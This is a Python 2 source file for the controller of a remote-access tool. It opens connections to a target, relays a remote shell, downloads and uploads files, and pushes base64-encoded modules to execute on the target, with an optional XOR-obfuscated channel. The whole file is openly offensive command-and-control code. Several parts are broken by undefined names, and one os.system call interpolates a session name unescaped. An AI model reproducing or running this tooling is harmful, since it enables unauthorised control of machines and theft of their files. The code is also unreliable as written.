#!/usr/bin/python

import socket
import core
import os, sys
import time
import signal
from base64 import *

socksize = 4092

class tcp:
    def __init__(self):
        signal.signal(signal.SIGINT, core.signalHandler)
        
    def download(self, filename, session):
        filename = filename.replace("/","_")
        data = conn.recv(socksize)
        newfile = file(core.DownloadDir+session+"-"+filename, "wb")
        newfile.write(data)
        newfile.close()
        if os.path.exists(core.DownloadDir+session+"-"+filename):
            print("[+] File saved: %s" % core.DownloadDir+session+"-"+filename)
        else:
            print("[!] Error saving file: %s" % core.DownloadDir+session+"-"+filename)
            
            
    def upload(self, filename):
        if os.path.exists(filename):
            sendfile = open(filename, "r")
            filedata = sendfile.read()
            sendfile.close()
            conn.sendall(filedata)
        else:
            print("[!] File not found!")
        
        
    def client(self, HOST, PORT, name):
        global conn
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            conn.connect((HOST, int(PORT)))
            print("[+] Connection established!")
            print("[+] Type :help to view commands")
            core.logging.info("New connection established to %s" % name)
        except:
            print("[!] Connection error!")
            core.logging.error("Connection to %s failed." % name)
            
        while True:
            data = conn.recv(socksize)
        
            if data.startswith(":savef"):
                try:
                    getname = data.split(" ")
                    fname = getname[1]
                    core.logging.info("Saving %s from %s" % (fname, name))
                    self.download(fname, name)
                except IndexError:
                    core.logging.error("No file provided for [:savef] command")
                
            elif data == ("Complete"):
                print "[+] Module transfer successful."
                print "[+] Executing module on target..."
                
            elif data == ("shell => "):
                cmd = raw_input(data)
                conn.sendall(str(cmd))
                
                if cmd == (":killme"):
                    print("[!] Shutting down server!")
                    core.logging.info("Shutting down %s completely." % name)
                    conn.close()
                    
                elif cmd.startswith(":download"):
                    try:
                        getname = cmd.split(" ")
                        fname = getname[1]
                        core.logging.info("Saving %s from %s." % (fname, name))
                        self.download(fname, name)
                        self.handle(conn, name)
                    except IndexError:
                        print("[!] Must specify download file!")
                    
                elif cmd.startswith(":upload"):
                    try:
                        getname = cmd.split(" ")
                        loc_file = getname[1]
                        core.logging.info("Uploading %s to %s." % (loc_name, name))
                        self.upload(loc_file)
                        self.handle(conn, name)
                    except IndexError:
                        print("[!] Must specify upload file!")
                    
                elif cmd.startswith(":exec"):
                    try:
                        getname = cmd.split(" ")
                        modname = getname[1]

                        if os.path.exists(core.ModulesDir+modname):
                            sendfile = open(core.ModulesDir+modname, "rb")         # read the file into buffer
                            filedata = sendfile.read()
                            sendfile.close()
                            time.sleep(3)
                            filedata = b64encode(filedata)                  # base64 encode file and send to server
                            conn.sendall(filedata)
                            core.logging.info("Executing %s on %s" % (modname, name))
                            data = conn.recv(socksize)
                        else:
                            print("[!] Module not found!")
                            
                    except IndexError:
                        print("[!] Must specify module name!")
                        
                elif cmd == (":help"):
                    core.shell_help()
                    
                elif cmd.startswith(":info"):
                    getname = cmd.split(" ")
                    modname = getname[1]

                    if os.path.exists(core.ModulesDir+modname):
                        info = open(core.ModulesDir+modname)
                        for line in info:
                            if "@description" in line:
                                split = line.split(":")
                                des = split[1]
                                print("\nDescription: %s " % des)
                            if "@author" in line:
                                split = line.split(":")
                                author = split[1]
                                print("Author: %s " % author)              
                                    
                            else:
                                pass
                                
                elif cmd == (":mods"):
                    print("[+] Available Modules: ")
                    print core.Modules
                        
                elif cmd == (":files"):
                    print("\n[+] Contents of Storage directory: ")
                    os.system("ls %s | grep %s" % (core.DownloadDir, name))
                    
                elif cmd == (":quit"):
                    print("[!] Closing shell connection.")
                    core.logging.info("Closing connection to %s" % name)
                    conn.close()
                    
                    
            elif data:
                print data
                
        conn.close()
        
                
            
    def server(self, HOST, PORT, name):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
        try:
            server.bind((HOST, int(PORT)))
            server.listen(5)
            print("Listening on port %s.." % PORT)
            global conn
            conn, addr = server.accept()
            print("New Connection!")
            core.logging.info("Connection established to %s:%s" % (HOST, PORT))
        except:
            print("[!] Connection error!")
            core.logging.error("Connection to %s failed." % name)
            
        while True:
            data = conn.recv(socksize)
        
            if data.startswith(":savef"):
                try:
                    getname = data.split(" ")
                    fname = getname[1]
                    core.logging.info("Saving %s from %s" % (fname, name))
                    self.download(fname, name)
                except IndexError:
                    core.logging.error("No filename provided for [:savef] command.")
                
            elif data == ("Complete"):
                print "[+] Module transfer successful."
                print "[+] Executing module on target..."
                
            elif data == ("shell => "):
                cmd = raw_input(data)
                conn.sendall(str(cmd))
                
                if cmd == (":killme"):
                    print("[!] Shutting down server!")
                    core.logging.info("Shutting down %s completely." % name)
                    conn.close()
                    
                elif cmd.startswith(":download"):
                    try:
                        getname = cmd.split(" ")
                        fname = getname[1]
                        core.logging.info("Saving %s from %s." % (fname, name))
                        self.download(fname, name)
                    except IndexError:
                        print("[!] Must specify download file!")
                    
                elif cmd.startswith(":upload"):
                    try:
                        getname = cmd.split(" ")
                        loc_file = getname[1]
                        core.logging.info("Uploading %s to %s." % (loc_name, name))
                        self.upload(loc_file)
                    except IndexError:
                        print("[!] Must specify upload file!")
                    
                elif cmd.startswith(":exec"):
                    try:
                        getname = cmd.split(" ")
                        modname = getname[1]

                        if os.path.exists(core.ModulesDir+modname):
                            sendfile = open(core.ModulesDir+modname, "rb")         # read the file into buffer
                            filedata = sendfile.read()
                            sendfile.close()
                            time.sleep(3)
                            filedata = b64encode(filedata)                  # base64 encode file and send to server
                            conn.sendall(filedata)
                            core.logging.info("Executing %s on %s" % (modname, name))
                            data = conn.recv(socksize)
                        else:
                            print("[!] Module not found!")
                            
                    except IndexError:
                        print("[!] Must specify module name!")
                        
                elif cmd == (":help"):
                    core.shell_help()
                    
                elif cmd.startswith(":info"):
                    try:
                        getname = cmd.split(" ")
                        modname = getname[1]

                        if os.path.exists(core.ModulesDir+modname):
                            info = open(core.ModulesDir+modname)
                            for line in info:
                                if "@description" in line:
                                    split = line.split(":")
                                    des = split[1]
                                    print("\nDescription: %s " % des)
                                if "@author" in line:
                                    split = line.split(":")
                                    author = split[1]
                                    print("Author: %s " % author)              
                                else:
                                    pass
                    
                    except IndexError:
                        print("[!] Must specify module name!")
                                
                elif cmd == (":mods"):
                    print("[+] Available Modules: ")
                    print core.Modules
                        
                elif cmd == (":files"):
                    print("\n[+] Contents of Storage directory: ")
                    os.system("ls %s | grep %s" % (core.DownloadDir, name))
                    
                elif cmd == (":quit"):
                    print("[!] Closing shell connection.")
                    core.logging.info("Closing connection to %s" % name)
                    conn.close()
                    
                    
            elif data:
                print data
                
        conn.close()




class xor:
    def __init__(self):
        signal.signal(signal.SIGINT, core.signalHandler)   
        
        
    def enc(string, key):
        data = ''
        for char in string:
            for ch in key:
                char = chr(ord(char) ^ ord(ch))
            data += char
        return data
        
           
    def download(self, filename, session):
        filename = filename.replace("/","_")
        data = conn.recv(socksize)
        newfile = file(core.DownloadDir+session+"-"+filename, "wb")
        newfile.write(data)
        newfile.close()
        if os.path.exists(core.DownloadDir+session+"-"+filename):
            print("[+] File saved: %s" % core.DownloadDir+session+"-"+filename)
        else:
            print("[!] Error saving file: %s" % core.DownloadDir+session+"-"+filename)
            
            
    def upload(self, filename):
        if os.path.exists(filename):
            sendfile = open(filename, "r")
            filedata = sendfile.read()
            sendfile.close()
            conn.sendall(filedata)
        else:
            print("[!] File not found!")
            
            
    def client(self, HOST, PORT, name, pkey):
        global pin
        pin = pkey
        conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            conn.connect((HOST, PORT))
            print("[+] Connection established!")
            print("[+] Type :help to view commands")
            core.logging.info("New connection established to %s" % name)
        except:
            print("[!] Connection error!")
            core.logging.info("Connection established to %s:%s" % (HOST, PORT))
        
        while True:
            xdata = conn.recv(socksize)
            data = self.enc(encd, pin)
            
            if data.startswith(":savef"):
                try:
                    getname = data.split(" ")
                    fname = getname[1]
                    core.logging.info("Saved file %s from %s" % (fname, name))
                    self.download(fname, name)
                except IndexError:
                    core.logging.info("No filename provided for [:savef] command.")

            elif data == ("Complete"):
                print "[+] Module transfer successful."
                print "[+] Executing module on target..."
                
            elif data == "shell => ":
                cmd = raw_input(data)
                xcmd = self.enc(cmd, pin)
                conn.sendall(xcmd)
                
                if cmd == (":killme"):
                    print("[!] Shutting down server!")
                    conn.close()
                    
                elif cmd == (":quit"):
                    print("[!] Closing shell connection!")
                    conn.close()
                    
                elif cmd.startswith(":download"):
                    try:
                        getname = cmd.split(" ")
                        fname = getname[1]
                        self.download(fname, name)
                    except IndexError:
                        print("[!] Must specify download file!")
                    
                elif cmd.startswith(":upload"):
                    try:
                        getname = cmd.split(" ")
                        loc_file = getname[1]
                        self.upload(loc_file)
                    except IndexError:
                        print("[!] Must specify upload file!")
                    
                elif cmd.startswith(":exec"):
                    try:
                        getname = cmd.split(" ")
                        modname = getname[1]
                    
                        if os.path.exists(ModulesDir+modname):
                            sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
                            filedata = sendfile.read()
                            sendfile.close()
                            time.sleep(3)
                            filedata = b64encode(filedata)                  # base64 encode file and send to server
                            conn.sendall(filedata)
                            data = conn.recv(socksize)                    # wait to receive the OK msg from server
                        else:
                            pass
                        
                    except IndexError:
                        print("[!] Must specify module name!")
                        
                elif cmd == (":help"):
                    core.shell_help()
                    
                elif cmd.startswith(":info"):
                    try:
                        getname = cmd.split(" ")
                        modname = getname[1]

                        if os.path.exists(core.ModulesDir+modname):
                            info = open(core.ModulesDir+modname)
                            for line in info:
                                if "@description" in line:
                                    split = line.split(":")
                                    des = split[1]
                                    print("\nDescription: %s " % des)
                                if "@author" in line:
                                    split = line.split(":")
                                    author = split[1]
                                    print("Author: %s " % author)              
                                else:
                                    pass
                    
                    except IndexError:
                        print("[!] Must specify module name!")
                                
                elif cmd == (":mods"):
                    print("[+] Available Modules: ")
                    print Modules
                        
                elif cmd == (":files"):
                    print("\n[+] Contents of Storage directory: ")
                    os.system("ls %s" % Download_Dir)
                    
                    
            elif data:
                print data
                
        conn.close()
        
                
            
    def server(self, HOST, PORT, name, pkey):
        global pin
        pin = pkey
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        try:
            server.bind((HOST, int(PORT)))
            server.listen(5)
            print("Listening on port %s.." % PORT)
            global conn
            conn, addr = server.accept()
            print("New Connection!")
            core.logging.info("Connection to local listener established: %s, %s" % (conn, addr)) 
            self.handle(conn, name)
        except:
            print("[!] Connection error!")
            core.logging.error("Listener failed to bind %s:%s" % (HOST, PORT))
            
        while True:
            xdata = conn.recv(socksize)
            data = self.enc(xdata, pin)
            
            if data.startswith(":savef"):
                try:
                    getname = data.split(" ")
                    fname = getname[1]
                    core.logging.info("Saved file %s from %s" % (fname, name))
                    self.download(fname, name)
                except:
                    core.logging.error("No filename provided for [:savef] command.")
                
            elif data == ("Complete"):
                print "[+] Module transfer successful."
                print "[+] Executing module on target..."
                
            elif data == "shell => ":
                cmd = raw_input(data)
                xcmd = self.enc(cmd, pin)
                conn.sendall(xcmd)
                
                if cmd == (":killme"):
                    print("[!] Shutting down server!")
                    conn.close()
                    
                elif cmd == (":quit"):
                    print("[!] Closing shell connection!")
                    conn.close()
                    
                elif cmd.startswith(":download"):
                    try:
                        getname = cmd.split(" ")
                        fname = getname[1]
                        self.download(fname, name)
                    except IndexError:
                        print("[!] Must specify download file!")
                    
                elif cmd.startswith(":upload"):
                    try:
                        getname = cmd.split(" ")
                        loc_file = getname[1]
                        self.upload(loc_file)
                    except IndexError:
                        print("[!] Must specify upload file!")
                    
                elif cmd.startswith(":exec"):
                    try:
                        getname = cmd.split(" ")
                        modname = getname[1]
                    
                        if os.path.exists(ModulesDir+modname):
                            sendfile = open(ModulesDir+modname, "rb")         # read the file into buffer
                            filedata = sendfile.read()
                            sendfile.close()
                            time.sleep(3)
                            filedata = b64encode(filedata)                  # base64 encode file and send to server
                            conn.sendall(filedata)
                            data = conn.recv(socksize)                    # wait to receive the OK msg from server
                        else:
                            pass
                        
                    except IndexError:
                        print("[!] Must specify module name!")
                        
                elif cmd == (":help"):
                    core.shell_help()
                    
                elif cmd.startswith(":info"):
                    try:
                        getname = cmd.split(" ")
                        modname = getname[1]

                        if os.path.exists(core.ModulesDir+modname):
                            info = open(core.ModulesDir+modname)
                            for line in info:
                                if "@description" in line:
                                    split = line.split(":")
                                    des = split[1]
                                    print("\nDescription: %s " % des)
                                if "@author" in line:
                                    split = line.split(":")
                                    author = split[1]
                                    print("Author: %s " % author)              
                                else:
                                    pass
                    
                    except IndexError:
                        print("[!] Must specify module name!")
                                
                elif cmd == (":mods"):
                    print("[+] Available Modules: ")
                    print Modules
                        
                elif cmd == (":files"):
                    print("\n[+] Contents of Storage directory: ")
                    os.system("ls %s" % Download_Dir)
                    
                    
            elif data:
                print data
                
        conn.close()


tcp = tcp()
xor = xor()
